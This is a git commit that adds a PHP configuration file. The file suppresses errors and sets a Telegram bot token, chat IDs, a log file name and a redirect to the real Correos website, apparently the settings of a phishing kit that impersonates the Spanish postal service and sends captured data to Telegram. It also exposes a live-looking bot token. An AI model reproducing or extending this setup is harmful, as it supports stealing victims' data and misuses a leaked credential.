5ad35019afea0e1b0866e79d257c9c40aecb5308
hamidtkeee <hamidtkee@gmail.com>
2022-11-09 17:06:23 +0100

    added new files

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5767250990:AAGBBuw8ugjbxrgCrHlXqLbsv3b9yngLesA");
+define("TELEGRAM_CHAT_ID", "-811920280");
+define("TELEGRAM_CHAT_IDD", "-811920280");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
